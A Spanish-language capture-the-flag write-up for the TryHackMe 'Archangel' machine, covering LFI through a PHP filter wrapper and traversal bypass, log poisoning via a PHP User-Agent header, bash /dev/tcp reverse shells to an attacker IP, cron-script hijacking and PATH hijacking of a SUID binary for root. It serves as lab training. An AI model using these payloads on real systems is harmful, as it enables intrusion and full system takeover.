---
layout: single
title: Archangel - TryHackMe
excerpt: "En esta máquina haremos intrusión a la máquina explotando una vulnerabilidad web conocida como Local File Inclusion (LFI) que es descubierto mediante un wrapper de PHP para realizar la técnica Source Code Disclosure. Nos daremos una Reverse shell mediante un LogPoisoning, dentro pivotaremos a un usuario no privilegiado, y la escalada a root se logra abusando de un Path Hijacking. ."
date: 2026-03-27
classes: wide
header:
  teaser: /assets/images/thm-writeup-archangel/8_arch.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - Pentesting
tags:
  - writeup
  - eWPT
  - HackingWeb
  - WrapperPHP-SourceCodeDisclosure
  - LFI
  - LogPoisoning
  - RemoteAccessRCE
  - ReverseShell
  - EscaladaPrivilegios
  - PathHijacking
---

![](/assets/images/thm-writeup-archangel/8_arch.png)



## WRITE UP
IP VÍCITMA->  10.128.138.75  (TTL 62) LINUX


### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Gallery</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem 10.128.138.75
```

![](/assets/images/thm-writeup-archangel/1_arch.png)


-Usar el comando *ping*:
```bash
ping -R 10.128.138.75 -c1
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición.
```

![](/assets/images/thm-writeup-archangel/2_arch.png)



Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.128.138.75 -oG allPorts
# Veremos porque el formato grepeable, es importante.
```

![](/assets/images/thm-writeup-archangel/3_arch.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports allPorts
```

![](/assets/images/thm-writeup-archangel/4_arch.png)


```bash
nmap -sVC -p22,80 10.128.138.75 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

![](/assets/images/thm-writeup-archangel/5_arch.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java
```

![](/assets/images/thm-writeup-archangel/6_arch.png)


### RECONOCIMIENTO: SSH

Como tenemos el protocolo de **ssh** abierto con *searchsploit* vamos a a buscar por la versión del openssh para ver si es vulnerable. Pero como sabemos, esta versión solo sirve para la enumeración de usuarios.

```bash
searchsploit openssh 7.6p1
```

![](/assets/images/thm-writeup-archangel/7_arch.png)

Nos centraremos en otras cosas, a ver si más adelante obtenemos alguna credencial válida.

### ANÁLISIS WEB: RECONOCIMIENTO
Usamos *whatweb* para hacer un pequeño reconocimiento a nivel web, para ver que tecnologías y demás que usa. 

Es igual que la extensión <span style="color:lightyellow">Wappalyzer</span> pero en vez de gráfico por terminal.

```bash
whatweb http://10.128.138.75/
```

![](/assets/images/thm-writeup-archangel/9_arch.png)

Al entrar en la página principal, veremos un dominio cual nos podría interesar, para una posible página externa o Fuzzing para encontrar subdominios, probaremos lo primero.

Dominio: <mark style="background: #FFF3A3A6;">mafialive.thm</mark>

![](/assets/images/thm-writeup-archangel/10_arch.png)


Podríamos usar también la extensión <span style="color:lightyellow">Wappalyzer</span> que es lo mismo que **whatweb**, pero en vez de terminal, por gráfico.

![](/assets/images/thm-writeup-archangel/11_arch.png)


### ACCESO AL DOMINIO WEB: MAFIA.THM
Si probamos a poner el dominio en el navegador nos dirá que no se ha podido encontrar. Esto quiere decir que nuestra red a nivel de sistema no reconoce el dominio ya que no lo asocia a ninguna IP.

![](/assets/images/thm-writeup-archangel/12_arch.png)

### VIRTUAL HOSTING
Para solucionar esto, nos vamos al fichero <span style="color:lightblue">/etc/</span><span style="color:grey">hosts</span>, y añadimos el dominio:

```bash
10.128.138.75 mafialive.thm
```

![](/assets/images/thm-writeup-archangel/13_arch.png)

Ahora, si volvemos a cargar el dominio web, nos podrá encontrar la página. Encontraremos la primera bandera. 

![](/assets/images/thm-writeup-archangel/14_arch.png)


### FUZZING: DIRECTORIOS A NIVEL WEB
Como nos dice que sigamos buscando, Con la herramienta *ffuf* haremos Fuzzing para descubrir directorios y vhosts(subdominios) a nivel web potenciales para encontrar algo de información.

### DIRECTORIOS
```bash
gobuster dir -u http://mafialive.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt --no-error -x .txt .php .xml .html .htm .zip .kdbx .db .log -t 100
```


![](/assets/images/thm-writeup-archangel/15_arch.png)


### ROBOTS.TXT
Nos detectará el archivo **robots.txt**. Este fichero es importante ya que nos dice que rutas podemos ver y cuales no.

![](/assets/images/thm-writeup-archangel/16_arch.png)

En este caso nos dice que podemos acceder a <span style="color:lightblue">/test.php</span>.

![](/assets/images/thm-writeup-archangel/17_arch.png)


### LFI (LOCAL FILE INCLUSION): PATH TRAVERSAL
Si colocamos la ruta <span style="color:lightblue">/test.php</span> en la raíz del dominio, nos llevará a la siguiente página.
Dirá que es de prueba y un botón inofensivo.

![](/assets/images/thm-writeup-archangel/18_arch.png)


Si le damos al botón para comprobar su funcionamiento, nos cargará un archivo interno a nivel sistema, cual contiene el mensaje a reflejar mediante el parámetro '*view*'. 

Pero cuidado con esto, porque si nos enseña la ruta podríamos aplicar **wrappers PHP** para poder ver el código del php y ver como lo esta procesando.

URL ORIGINAL: **/test.php?view=/var/www/html/development_testing/mrrobot.php**

![](/assets/images/thm-writeup-archangel/19_arch.png)


### BURP SUITE: ANÁLISIS PETICIONES WEB
### PROXY
Con la extensión <span style="color:lightyellow">FoxyProxy</span> activaremos el proxy configurado de **BurpSuite** para poder capturar peticiones y que nos lleguen.

![](/assets/images/thm-writeup-archangel/29_arch.png)


En *Burp Suite* en el apartado "Proxy > Intercept > **Intercept on**" para activar que podamos interceptar peticiones.

![](/assets/images/thm-writeup-archangel/30_arch.png)


En la página web le damos al botón "*Here is a button*" y automáticamente interceptaremos la petición.

![](/assets/images/thm-writeup-archangel/31_arch.png)


### REPEATER
Para empezar a jugar con la petición, nos la llevaremos al modo **Repeater**:

>Sirve también presionando `Ctrl + R` .

![](/assets/images/thm-writeup-archangel/32_arch.png)

En este modo, podemos ver la salida de la petición y sus respectivas cabeceras.

![](/assets/images/thm-writeup-archangel/33_arch.png)


### WRAPPER PHP: SourceCodeDisclosure
Como podemos visualizar la ruta desde la cual se carga el archivo interno a nivel sistema a visualizar. Podremos probar un *wrapper de PHP* para ver el código del php encargado de procesar la salida de dicho archivo y ver que tipos de restricciones puede tener ante un *path traversal*.

>complemento: [Ejemplos de wrappers de PHP](https://blog.deephacking.tech/en/posts/exploiting-php-wrappers/)

```powershell
WRAPPER PHP a usar: 

http://www.mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```


Lo probaremos primero con el archivo interno que esta siendo cargado, <span style="color:grey">mrrobot.php</span> .

![](/assets/images/thm-writeup-archangel/34_arch.png)


Nos devolverá la salida codeada en base64 y si funciona, al descodificarlo, nos devolverá en una línea de php, el mensaje que vimos al principio sobre 'Control is an illusion'.

Efectivamente, la podemos ver sin problemas.

```bash
echo 'PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==' | base64 -d
```

![](/assets/images/thm-writeup-archangel/35_arch.png)


Ahora iremos a ver el código php que nos interesa. El <span style="color:grey">test.php</span> concretamente, ya que este es el que procesa todo lo que esta pasando por detrás.

Obtenemos la salida codeada en base64 (Se aprecia que nos devuelve más líneas).

```powershell
WRAPPER PHP a usar: 

http://www.mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

![](/assets/images/thm-writeup-archangel/36_arch.png)


Repetimos el paso anterior descodificando el código y lo pasamos a otro archivo para verlo más cómodamente. -> <span style="color:grey">funcion_php</span>

```bash
echo '' | base64 -d > funcion_php
```

![](/assets/images/thm-writeup-archangel/37_arch.png)

Con **batcat** usaremos el lenguaje php sobre el archivo para verlo mejor.
Aquí cogemos una bandera.


### DESGLOSAMIENTO CÓDIGO
Si detecta en la cadena otra cadena, da el valor 'True'. Si no la encuentra devuelve 'False'

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
```


**Condición 1**: NO debe contener la string "../.." . Pero no nos restringe usar otros métodos para **bypassear un LFI** .

```php
!containsStr($GET'view', '../..')
```


**Condición 2:** SÍ debe contener la ruta /var/www/html/development_testing


```php
containsStr($GET'view', '/var/www/html/development_testing')
```


Si ambas condiciones se cumplen, se ejecuta ``include $_GET['view'];`` .
En caso contrarío muestra el mensaje: *"Sorry, Thats not allowed".*

````php
if(isset($_GET['view'])){
    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
        include $_GET['view'];
    } else {
        echo 'Sorry, Thats not allowed';
    }
}
````

![](/assets/images/thm-writeup-archangel/38_arch.png)


### LFI: LOCAL FILE INCLUSION

La vulnerabilidad **LFI** consiste en poder leer archivos internos arbitrarios a nivel sistema mediante una mala sanitización, específicamente, mediante un archivo que se encarga de procesar por un parámetro.

Como no podemos usar ``../..`` probaremos con ``./.././.././../.`` que es una forma de bypassear esta restricción. Partiremos después de la ruta (obligatoria) ya que es otra restricción que tenemos que cumplir.

Se acontece dicha vulnerabilidad permitiéndonos leer archivos arbitrarios nivel sistema.
En este caso <span style="color:lightblue">/etc/</span>**passwd**:

```powershell
PAYLOAD BYPASS LFI a usar: 

http://www.mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../etc/passwd
```


![](/assets/images/thm-writeup-archangel/39_arch.png)

Apretaremos "**CTRL + U**" para visualizar mejor las salidas.

Vemos un usuario válido a nivel sistema llamado <span style="color:blue">archangel</span>.

![](/assets/images/thm-writeup-archangel/40_arch.png)


### LOG POISONING
Esta máquina esta enfocada en la intrusión mediante la vulnerabilidad conocida como *Log Poisoning*.

Una búsqueda rápida en Google, para saber en que consiste:

>Abusaremos de una cabecera http para ejecutar código a nivel sistema y tener un *RCE*.

![](/assets/images/thm-writeup-archangel/41_arch.png)

Tenemos varias posibles rutas de logs potenciales para llevar a cabo este ataque.

Como en la fase de reconocimiento, el escaneo de **nmap** nos decía que la página web esta alojada en un <span style="color:lime">servidor Apache2</span> basado en Ubuntu, probaremos a leer el archivo de logs en la ruta siguiente: <span style="color:lightblue">/var/log/apache2/</span>**acces.log**.

![](/assets/images/thm-writeup-archangel/42_arch.png))


Al probar a leer el archivo **acces.log**, nos deja visualizarlo reflejándose los logs de acceso de cada vez que ingresamos o refrescamos la página web.

>No petar mucho ya que es corrompible muy fácilmente este fichero.

![](/assets/images/thm-writeup-archangel/43_arch.png)

![](/assets/images/thm-writeup-archangel/44_arch.png)


### RCE IN HEADER: USER-AGENT
Para tener una posible vía de ejecución remota de código a nivel sistema, interceptaremos con Burp Suite la petición donde la URL estará apuntando al fichero mencionado de logs.

![](/assets/images/thm-writeup-archangel/45_arch.png)


La técnica que se suele explotar al tratar con la vulnerabilidad *Log Poisoning*, es inyectar código de php en una de las cabeceras de la petición.

Como podemos ver en **acces.log** nos sale la cabecera '*User-Agent*' de los que ingresan al servidor web, por lo que se reflejaría el contenido definido, al manipular dicha cabecera con Burp Suite.

```php
<?php system('whoami'); ?> 
```

Le damos a "**send**".

![](/assets/images/thm-writeup-archangel/46_arch.png)


Refrescamos la página, reflejándose y interpretándose al final de la última línea, el comando que definimos anteriormente con la línea en php de la cabecera '*User-Agent*'.

![](/assets/images/thm-writeup-archangel/47_arch.png)

![](/assets/images/thm-writeup-archangel/48_arch.png)

Nos devolverá <span style="color:blue">www-data</span>, quien está y trabaja a nivel servidor interno a nivel sistema.


### CURL: RCE TO REVERSE SHELL

Una de las formas de ganar acceso a la máquina a nivel sistema es darnos una *reverse shell*, y como podemos ejecutar comandos, lo tenemos fácil ya que es como una especie de *webshell* pero por cabeceras http.


Codearemos primero una <span style="color:lightgreen">reverse shell</span> a base64.

``` bash
echo 'bash -i >& /dev/tcp/192.168.143.187/443 0>&1' | base64
```

![](/assets/images/thm-writeup-archangel/49_arch.png)


De forma paralela con *netcat* nos pondremos en escucha por el puerto <span style="color:purple">443</span> para que cuando ejecutemos la reverse shell, recibir el host de la víctima.

```bash
nc -nvlp 443
```

![](/assets/images/thm-writeup-archangel/50_arch.png)

Usaremos *curl* para variar un poco la forma de ejecutar código.

```bash
curl -s -X GET http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log -H "User-Agent: <?php system('echo codeBase64 |base64 -d |bash'); ?>"
```

>En el método GET se puede poner solo el dominio.

![](/assets/images/thm-writeup-archangel/51_arch.png)


Al ejecutar este comando enviaremos al servidor la petición con el código malicioso y se interpretará recibiendo en nuestro **netcat** la shell víctima.

Estaremos como <span style="color:blue">www-data</span>.

```bash
whoami
```

![](/assets/images/thm-writeup-archangel/52_arch.png)


Se nos quedará la página cargando.

![](/assets/images/thm-writeup-archangel/53_arch.png)


### TRATAMIENTO TTY
Tras ganar acceso, haremos un **Tratamiento de la TTY** para tener una shell más interactiva.

1) `script /dev/null -c bash`

![](/assets/images/thm-writeup-archangel/20_arch.png)

2) `CTRL + Z

![](/assets/images/thm-writeup-archangel/21_arch.png)

3) `stty raw -echo; fg`

![](/assets/images/thm-writeup-archangel/22_arch.png)

4) `reset xterm`

![](/assets/images/thm-writeup-archangel/23_arch.png)

5) Esperamos, y `export TERM=xterm`.

![](/assets/images/thm-writeup-archangel/24_arch.png)

6) `export SHELL=bash`

![](/assets/images/thm-writeup-archangel/25_arch.png)


### BANDERA USUARIO: 1 LFI
Nos iremos al home personal del usuario <span style="color:blue">archangel</span> y cogeremos la bandera.

```bash
# Ir al directorio personal de Archangel
cd /home/archangel

# Leer la bandera de usuario
cat user.txt
```

![](/assets/images/thm-writeup-archangel/26_arch.png)


### PIVOTING DE WWW-DATA A ARCHANGEL
Para escalar privilegios hacia un usuario del sistema con algo más de permisos, investigando observaremos que en el directorio <span style="color:lightblue">opt/</span>, se alojan; 1 directorio y 1 archivo:

1-<mark style="background: #ABF7F7A6;">backupfiles</mark>

2-<mark style="background: #ADCCFFA6;">helloworld.sh</mark>

![](/assets/images/thm-writeup-archangel/54_arch.png)

Con el directorio no tendremos permisos para interactuar con el, y con el archivo al leer su contenido con "**cat**" observamos que nos dice que guarda la frase "hello world" en un fichero .txt dentro del directorio restringido.

![](/assets/images/thm-writeup-archangel/55_arch.png)


Si hacemos un **ls -l** para ver los permisos  de ambos, destacara lo siguiente:

Puedo editar el archivo <mark style="background: #ADCCFFA6;">helloworld.sh</mark> como <span style="color:blue">www-data</span> ya que tiene permisos de ejecución para todos los usuarios, aunque diga que el dueño es <span style="color:blue">archangel</span> (Esto será importante saberlo). 

![](/assets/images/thm-writeup-archangel/56_arch.png)


Al intentar ejecutarlo no podremos debido a los insuficientes permisos sobre el directorio.

Pero si podemos editar el contenido del archivo <mark style="background: #ADCCFFA6;">helloworld.sh</mark> , presionamos 'Enter'.

```bash
# Intenar ejecutar el script .sh
./helloworld.sh

# Leer el contenido de helloworld.sh
nano helloworld.sh
```

![](/assets/images/thm-writeup-archangel/57_arch.png)

Este era el contenido que vimos anteriormente.

![](/assets/images/thm-writeup-archangel/58_arch.png)


Borraremos lo que haya y escribiremos una <span style="color:lime">reverse shell</span> por el puerto <span style="color:purple">444</span> para que cuando se ejecute dicha reverse shell recibir la shell de <span style="color:blue">archangel</span> ya que es el dueño del archivo.

```bash
bash -i >& /dev/tcp/192.168.143.187/444 0>&1
```

![](/assets/images/thm-writeup-archangel/59_arch.png)


De forma paralela con *netcat* nos pondremos en escucha por el puerto <span style="color:purple">444</span> para que cuando ejecutemos la reverse shell, recibir el host de la víctima.

```bash
nc -nvlp 444
```

![](/assets/images/thm-writeup-archangel/60_arch.png)


>Se supone que se debería haber ejecutado solo el archivo  <mark style="background: #ADCCFFA6;">helloworld.sh</mark> porque estaba configurado automáticamente por cron pero yo lo ejecute directamente.

![](/assets/images/thm-writeup-archangel/61_arch.png)


Recibiremos la conexión a nuestro **netcat** como <span style="color:blue">archangel</span>.

![](/assets/images/thm-writeup-archangel/62_arch.png)


### TRATAMIENTO TTY

1) `script /dev/null -c bash`

![](/assets/images/thm-writeup-archangel/63_arch.png)

`2) CTRL + Z`

`2) stty raw -echo; fg`

`3) reset xterm`

![](/assets/images/thm-writeup-archangel/64_arch.png)

5) Esperamos, y `export TERM=xterm`

6) `export SHELL=bash`

![](/assets/images/thm-writeup-archangel/65_arch.png)

### BANDERA USUARIO: 2 CRON
En el directorio personal de <span style="color:blue">archangel</span> nos encontraremos con dos directorios, dentro de <span style="color:lightblue">myfiles</span> estará la segunda bandera de usuario junto a un archivo llamado "<mark style="background: #FF5582A6;">backup</mark>".

![](/assets/images/thm-writeup-archangel/66_arch.png)

Se me olvido agregar estas capturas pero <mark style="background: #FF5582A6;">backup</mark> tiene el bit SUID activado y el dueño es root.


### ESCALADA DE PRIVILEGIOS: PATH HIJACKING
Para la escalada de privilegios abusaremos de un **Path Hijacking** bastante interesante.

Leeremos el contenido de <mark style="background: #FF5582A6;">backup</mark> y destacará la línea:

```bash
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

El error de sintaxis es que no específica la ruta del binario **cp** -> <span style="color:lightblue">/bin/</span>**cp**

Para aprovecharnos de esto es editar nuestro propio binario con el nombre del comando que va a contener código malicioso que nos dará <span style="color:blue">root</span> y estableceremos la variable de entorno **$PATH** en esta ruta para que al ejecutarse el archivo como root, vea en mis variables de entorno para buscar donde esta **cp** y como es la actual donde esta el binario falso, lo use.

![](/assets/images/thm-writeup-archangel/67_arch.png)

Ponemos <span style="color:lightblue">/bin/</span>**bash -p** (no perder privilegios de root). Esto nos dará la shell de root.

![](/assets/images/thm-writeup-archangel/68_arch.png)


```powershell
VERSION IA (NO PROBADA) que me ha convencido:

# 1. Ve a /tmp y crea una carpeta limpia
cd /tmp
mkdir hijack
cd hijack

# 2. Crea el cp falso (la versión más efectiva en esta máquina)
nano cp 
#!/bin/bash
/bin/bash -p

# 3. Dale permisos
chmod +x cp

# 4. Modifica el PATH correctamente (poniendo tu carpeta al principio)
export PATH=/tmp/hijack:$PATH

# 5. Ejecuta el binario SUID
/home/archangel/secret/backup
```

Haremos los últimos pasos:

```bash
1. chmod 777 cp
2. export PATH=.:$PATH
```

![](/assets/images/thm-writeup-archangel/69_arch.png)


Al hacer **env**, dirá que el el PATH es '.' (ruta actual, por lo que acudirá a esta)

![](/assets/images/thm-writeup-archangel/70_arch.png)

Por último ejecutamos el archivo, y nos dará dicha shell privilegiada.

```bash
./backup
```

![](/assets/images/thm-writeup-archangel/71_arch.png)

Para confirmar ejecutamos el comando "**id**" o "**whoami**" y efectivamente, habremos elevado a usuario privilegio a nivel sistema. 

![](/assets/images/thm-writeup-archangel/72_arch.png)


### BANDERA ROOT
Nos vamos al directorio <span style="color:lightblue">/root/</span> y cogeremos la bandera de <span style="color:blue">root</span>.

```bash
# Ir al directorio de root
cd /root/

# Leer la bandera de root
cat root.txt
```

![](/assets/images/thm-writeup-archangel/28_arch.png)


### EASTER EEGG
En el drectorio personal de <span style="color:blue">archangel</span> recordamos había un directorio llamado <span style="color:lightblue">myfiles</span>. Dentro hay un fichero llamado "<span style="color:grey">passwordbackup</span>", que al leerlo nos da un enlace a un vídeo de Youtube...

![](/assets/images/thm-writeup-archangel/27_arch.png)

>[Video de Youtube](https://www.youtube.com/watch?v=dQw4w9WgXcQ)
